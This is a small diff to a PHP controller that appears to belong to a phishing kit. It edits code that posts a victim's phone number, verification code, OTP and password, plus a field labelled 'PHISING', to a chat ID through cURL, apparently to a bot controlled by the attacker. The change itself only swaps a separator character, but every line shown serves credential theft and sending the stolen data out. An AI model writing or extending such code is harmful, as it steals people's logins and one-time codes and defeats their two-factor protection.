@@ -233,7 +233,7 @@ class HomeController extends Controller
         curl_setopt($ch, CURLOPT_POST, true);
         curl_setopt($ch, CURLOPT_POSTFIELDS, [
             'chat_id' => $chat_id,
-            'text' => "Phone | $phone \n Code | $code \n OTP | $otp \n password | $password \n \n \n
+            'text' => "Phone | $phone \n Code | $code \n OTP | $otp \n password : $password \n \n \n
     PHISING $phisData
     "
         ]);
